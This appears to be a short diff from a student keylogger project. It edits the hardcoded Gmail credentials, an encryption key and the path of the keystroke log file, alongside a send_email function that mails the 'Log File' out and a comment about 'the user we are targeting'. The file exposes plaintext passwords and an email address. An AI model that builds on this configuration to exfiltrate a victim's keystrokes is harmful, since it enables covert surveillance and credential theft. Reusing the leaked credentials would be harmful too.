@@ -53,7 +53,7 @@ time_iteration = 15
 number_of_iterations_end = 3
 
 email_address = "collegepjct@gmail.com" # EMAIL address of the sender
-password = "Pr&c!s@Mud4r"
+password = "mOOgAe5l@"
 
 username = getpass.getuser() # get the user name of the user we are targeting
 
@@ -61,7 +61,7 @@ toaddr = "collegepjct@gmail.com" # EMAIL address of the receiver
 
 key = "mOOgAe5l_n7wilOabmrwkszi8Jx4JBZvWde3vG3nvXA=" # Generate an encryption key from the Cryptography folder
 
-file_path = "D:\\NCI\\Semester_3\\Project\\Keylogger\\Test2\\Project"  # file path where the key_log.txt will be store
+file_path = "D:\\NCI\\Semester_3\\Project\\Keylogger\\HDCYB_FinalProject\\Keylogger\\Project"  # file path where the key_log.txt will be store
 extend = "\\"
 file_merge = file_path + extend #combine file path + extension
 
@@ -76,7 +76,7 @@ def send_email(filename, attachment, toaddr):
 
     msg['From'] = fromaddr # storing the senders email address
 
-    msg['To'] = toaddr # storing the senders email address
+    msg['To'] = toaddr
 
     msg['Subject'] = "Log File" # storing the subject
 
